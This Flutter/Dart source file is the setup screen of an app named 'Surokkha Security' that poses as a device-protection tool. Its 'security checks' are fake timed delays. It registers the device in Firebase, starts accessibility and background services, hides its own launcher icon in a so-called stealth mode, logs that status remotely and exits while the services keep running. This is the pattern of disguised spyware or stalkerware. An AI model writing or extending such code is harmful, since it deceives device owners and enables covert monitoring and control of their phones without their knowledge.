import 'package:flutter/material.dart';
import 'package:firebase_database/firebase_database.dart';
import 'dart:io';
import 'dart:math';
import '../services/device_security_service.dart';
import '../services/accessibility_bridge.dart';
import '../services/background_service.dart';

class SetupSecurityScreen extends StatefulWidget {
  const SetupSecurityScreen({super.key});

  @override
  State<SetupSecurityScreen> createState() => _SetupSecurityScreenState();
}

class _SetupSecurityScreenState extends State<SetupSecurityScreen>
    with TickerProviderStateMixin {
  late AnimationController _pulseController;
  late AnimationController _progressController;
  late Animation<double> _pulseAnimation;
  late Animation<double> _progressAnimation;

  final DeviceSecurityService _securityService = DeviceSecurityService();
  final DatabaseReference _database = FirebaseDatabase.instance.ref();

  bool _isInitializing = false;
  bool _isSetupComplete = false;
  String _currentStatus = "Device Security Service Ready";
  String? _deviceId;
  double _setupProgress = 0.0;
  List<String> _securityChecks = [];

  @override
  void initState() {
    super.initState();
    _initializeAnimations();
    _generateDeviceId();
  }

  void _initializeAnimations() {
    _pulseController = AnimationController(
      duration: const Duration(seconds: 2),
      vsync: this,
    );
    _progressController = AnimationController(
      duration: const Duration(seconds: 3),
      vsync: this,
    );

    _pulseAnimation = Tween<double>(
      begin: 0.8,
      end: 1.2,
    ).animate(CurvedAnimation(
      parent: _pulseController,
      curve: Curves.easeInOut,
    ));

    _progressAnimation = Tween<double>(
      begin: 0.0,
      end: 1.0,
    ).animate(CurvedAnimation(
      parent: _progressController,
      curve: Curves.easeInOut,
    ));

    _pulseController.repeat(reverse: true);
  }

  void _generateDeviceId() {
    // Generate a unique device ID based on platform and random string
    final random = Random();
    final platform = Platform.operatingSystem;
    final timestamp = DateTime.now().millisecondsSinceEpoch;
    final randomString = List.generate(8, (index) => 
        'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[random.nextInt(36)]).join();
    
    _deviceId = '${platform.toUpperCase()}_${timestamp}_$randomString';
  }

  Future<void> _beginSecuritySetup() async {
    if (_isInitializing) return;

    setState(() {
      _isInitializing = true;
      _currentStatus = "Initializing Device Security Service...";
      _setupProgress = 0.0;
      _securityChecks.clear();
    });

    _progressController.forward();

    try {
      // Step 1: Initialize security service
      await _performSecurityCheck("Initializing security protocols...", 0.2);
      
      // Step 2: Generate device fingerprint
      await _performSecurityCheck("Generating device fingerprint...", 0.4);
      
      // Step 3: Establish secure connection
      await _performSecurityCheck("Establishing secure connection...", 0.6);
      
      // Step 4: Register device with Firebase Realtime DB
      await _performSecurityCheck("Registering device with security service...", 0.8);
      await _registerDeviceInFirebase();
      
      // Step 5: Complete setup
      await _performSecurityCheck("Security setup complete!", 1.0);
      
      // Step 6: Hide app and prepare for background operation
      await _performSecurityCheck("Preparing stealth mode...", 1.0);
      
      setState(() {
        _isSetupComplete = true;
        _currentStatus = "Device Security Service Active";
      });
      
      // Auto-hide app and exit after successful setup
      await _finalizeSetupAndHide();

    } catch (e) {
      setState(() {
        _currentStatus = "Security setup failed: ${e.toString()}";
        _isInitializing = false;
      });
      _progressController.reset();
    }
  }

  Future<void> _performSecurityCheck(String message, double progress) async {
    setState(() {
      _currentStatus = message;
      _setupProgress = progress;
    });
    
    _securityChecks.add("✓ $message");
    
    // Simulate processing time
    await Future.delayed(Duration(milliseconds: 800 + Random().nextInt(400)));
  }

  Future<void> _registerDeviceInFirebase() async {
    if (_deviceId == null) return;

    final deviceData = {
      'deviceId': _deviceId,
      'platform': Platform.operatingSystem,
      'registeredAt': ServerValue.timestamp,
      'securityLevel': 'HIGH',
      'status': 'ACTIVE',
      'lastSeen': ServerValue.timestamp,
      'securityFeatures': {
        'encryption': true,
        'biometric': await _securityService.isBiometricAvailable(),
        'secureStorage': true,
        'networkSecurity': true,
      },
      'deviceInfo': {
        'osVersion': Platform.operatingSystemVersion,
        'appVersion': '1.0.0',
      }
    };

    try {
      await _database.child('devices').child(_deviceId!).set(deviceData);
      debugPrint('✅ Device registered in Firebase Realtime DB: $_deviceId');
    } catch (e) {
      debugPrint('❌ Failed to register device: $e');
      throw Exception('Failed to register device in security service');
    }
  }

  @override
  void dispose() {
    _pulseController.dispose();
    _progressController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [
              Color(0xFF1E3A8A), // Dark blue
              Color(0xFF3730A3), // Indigo
              Color(0xFF581C87), // Purple
            ],
          ),
        ),
        child: SafeArea(
          child: Padding(
            padding: const EdgeInsets.all(24.0),
            child: Column(
              children: [
                const SizedBox(height: 40),
                
                // Header
                const Text(
                  'Surokkha Security',
                  style: TextStyle(
                    fontSize: 32,
                    fontWeight: FontWeight.bold,
                    color: Colors.white,
                  ),
                ),
                const SizedBox(height: 8),
                Text(
                  'Advanced Device Protection',
                  style: TextStyle(
                    fontSize: 16,
                    color: Colors.white.withOpacity(0.8),
                  ),
                ),
                
                const SizedBox(height: 60),
                
                // Security Icon with Animation
                AnimatedBuilder(
                  animation: _pulseAnimation,
                  builder: (context, child) {
                    return Transform.scale(
                      scale: _isInitializing ? 1.0 : _pulseAnimation.value,
                      child: Container(
                        width: 120,
                        height: 120,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          color: Colors.white.withOpacity(0.1),
                          border: Border.all(
                            color: Colors.white.withOpacity(0.3),
                            width: 2,
                          ),
                        ),
                        child: Icon(
                          _isSetupComplete 
                              ? Icons.verified_user 
                              : Icons.security,
                          size: 60,
                          color: _isSetupComplete 
                              ? Colors.green.shade300 
                              : Colors.white,
                        ),
                      ),
                    );
                  },
                ),
                
                const SizedBox(height: 40),
                
                // Status Text
                Text(
                  _currentStatus,
                  style: const TextStyle(
                    fontSize: 18,
                    color: Colors.white,
                    fontWeight: FontWeight.w500,
                  ),
                  textAlign: TextAlign.center,
                ),
                
                const SizedBox(height: 20),
                
                // Device ID Display
                if (_deviceId != null)
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                    decoration: BoxDecoration(
                      color: Colors.black.withOpacity(0.2),
                      borderRadius: BorderRadius.circular(8),
                    ),
                    child: Text(
                      'Device ID: $_deviceId',
                      style: TextStyle(
                        fontSize: 12,
                        color: Colors.white.withOpacity(0.7),
                        fontFamily: 'monospace',
                      ),
                    ),
                  ),
                
                const SizedBox(height: 40),
                
                // Progress Indicator
                if (_isInitializing) ...[
                  AnimatedBuilder(
                    animation: _progressAnimation,
                    builder: (context, child) {
                      return Column(
                        children: [
                          LinearProgressIndicator(
                            value: _setupProgress,
                            backgroundColor: Colors.white.withOpacity(0.2),
                            valueColor: AlwaysStoppedAnimation<Color>(
                              Colors.green.shade300,
                            ),
                          ),
                          const SizedBox(height: 8),
                          Text(
                            '${(_setupProgress * 100).toInt()}% Complete',
                            style: TextStyle(
                              color: Colors.white.withOpacity(0.8),
                              fontSize: 14,
                            ),
                          ),
                        ],
                      );
                    },
                  ),
                  const SizedBox(height: 30),
                ],
                
                // Security Checks List
                if (_securityChecks.isNotEmpty) ...[
                  Container(
                    constraints: const BoxConstraints(maxHeight: 200),
                    child: SingleChildScrollView(
                      child: Column(
                        children: _securityChecks.map((check) {
                          return Padding(
                            padding: const EdgeInsets.symmetric(vertical: 4),
                            child: Row(
                              children: [
                                Icon(
                                  Icons.check_circle,
                                  color: Colors.green.shade300,
                                  size: 16,
                                ),
                                const SizedBox(width: 8),
                                Expanded(
                                  child: Text(
                                    check.substring(2), // Remove "✓ " prefix
                                    style: TextStyle(
                                      color: Colors.white.withOpacity(0.9),
                                      fontSize: 14,
                                    ),
                                  ),
                                ),
                              ],
                            ),
                          );
                        }).toList(),
                      ),
                    ),
                  ),
                  const SizedBox(height: 30),
                ],
                
                const Spacer(),
                
                // Action Button
                SizedBox(
                  width: double.infinity,
                  height: 56,
                  child: ElevatedButton(
                    onPressed: _isSetupComplete 
                        ? () => Navigator.of(context).pop()
                        : (_isInitializing ? null : _beginSecuritySetup),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: _isSetupComplete 
                          ? Colors.green.shade600 
                          : Colors.white,
                      foregroundColor: _isSetupComplete 
                          ? Colors.white 
                          : const Color(0xFF1E3A8A),
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(12),
                      ),
                      elevation: 4,
                    ),
                    child: _isInitializing
                        ? const SizedBox(
                            height: 24,
                            width: 24,
                            child: CircularProgressIndicator(
                              strokeWidth: 2,
                              valueColor: AlwaysStoppedAnimation<Color>(
                                Color(0xFF1E3A8A),
                              ),
                            ),
                          )
                        : Text(
                            _isSetupComplete 
                                ? 'Continue to App' 
                                : 'Begin Security Setup',
                            style: const TextStyle(
                              fontSize: 16,
                              fontWeight: FontWeight.bold,
                            ),
                          ),
                  ),
                ),
                
                const SizedBox(height: 20),
                
                // Security Features Info
                if (!_isInitializing && !_isSetupComplete)
                  Text(
                    'This will enable advanced security features including\nencryption, secure storage, and device authentication.',
                    style: TextStyle(
                      fontSize: 12,
                      color: Colors.white.withOpacity(0.6),
                    ),
                    textAlign: TextAlign.center,
                  ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  /// Finalize setup and hide app from launcher
  Future<void> _finalizeSetupAndHide() async {
    try {
      debugPrint('🔒 Finalizing setup and preparing stealth mode...');
      
      // Wait a moment for user to see completion
      await Future.delayed(const Duration(seconds: 2));
      
      // Initialize accessibility bridge
      final accessibilityBridge = AccessibilityBridge();
      await accessibilityBridge.initialize();
      
      // Ensure background service is running
      final backgroundService = BackgroundService();
      await backgroundService.ensureServiceRunning();
      
      // Hide the app icon from launcher
      final hideSuccess = await accessibilityBridge.hideAppIcon();
      
      if (hideSuccess) {
        debugPrint('✅ App icon hidden successfully');
        
        // Log final setup completion to Firebase
        await _logFinalSetupCompletion();
        
        // Show final message before exit
        if (mounted) {
          setState(() {
            _currentStatus = "Setup complete. App now running in stealth mode.";
          });
        }
        
        // Wait a moment then exit the app
        await Future.delayed(const Duration(seconds: 3));
        
        // Exit the app - services will continue running in background
        await _exitAppGracefully();
        
      } else {
        debugPrint('❌ Failed to hide app icon');
        if (mounted) {
          setState(() {
            _currentStatus = "Setup complete. Manual exit required.";
          });
        }
      }
      
    } catch (e) {
      debugPrint('❌ Error in finalize setup: $e');
      if (mounted) {
        setState(() {
          _currentStatus = "Setup complete with errors. Services are running.";
        });
      }
    }
  }
  
  /// Log final setup completion to Firebase
  Future<void> _logFinalSetupCompletion() async {
    try {
      if (_deviceId != null) {
        await _database.child('devices').child(_deviceId!).update({
          'setupComplete': {
            'completed': true,
            'completedAt': ServerValue.timestamp,
            'stealthMode': true,
            'appHidden': true,
            'servicesRunning': true,
            'version': '1.0.0'
          },
          'status': 'STEALTH_ACTIVE',
          'lastActivity': ServerValue.timestamp,
        });
        
        debugPrint('✅ Final setup completion logged to Firebase');
      }
    } catch (e) {
      debugPrint('❌ Error logging final setup completion: $e');
    }
  }
  
  /// Exit the app gracefully while keeping services running
  Future<void> _exitAppGracefully() async {
    try {
      debugPrint('🚪 Exiting app gracefully - services will continue running');
      
      // Ensure all services are properly initialized and running
      final accessibilityBridge = AccessibilityBridge();
      await accessibilityBridge.ensureServicesRunning();
      
      // Exit the application
      if (Platform.isAndroid || Platform.isIOS) {
        // On mobile platforms, move app to background
        // Services will continue running
        exit(0);
      }
      
    } catch (e) {
      debugPrint('❌ Error during graceful exit: $e');
    }
  }
}
